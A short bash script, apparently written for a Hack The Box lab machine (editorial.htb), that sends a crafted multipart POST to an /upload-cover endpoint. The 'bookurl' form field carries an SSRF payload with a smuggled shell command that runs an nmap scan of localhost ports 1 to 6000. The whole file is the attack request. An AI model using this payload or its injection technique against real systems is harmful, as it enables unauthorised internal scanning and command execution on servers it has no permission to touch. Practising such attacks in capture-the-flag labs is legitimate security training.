#!/bin/bash

# Target URL
url="http://editorial.htb/upload-cover"

# SSRF Payload
payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1"

# cURL command to send the POST request
curl -X POST "$url" \
  -H "Host: editorial.htb" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Content-Type: multipart/form-data; boundary=---------------------------344841833123013796121821834300" \
  -H "Origin: http://editorial.htb" \
  -H "Connection: close" \
  -H "Referer: http://editorial.htb/upload" \
  --data-binary $'-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------344841833123013796121821834300\r\nContent-Disposition: form-data; name="bookfile"; filename="doc1"\r\nContent-Type: application/octet-stream\r\n\r\n(binary file content)\r\n-----------------------------344841833123013796121821834300--'
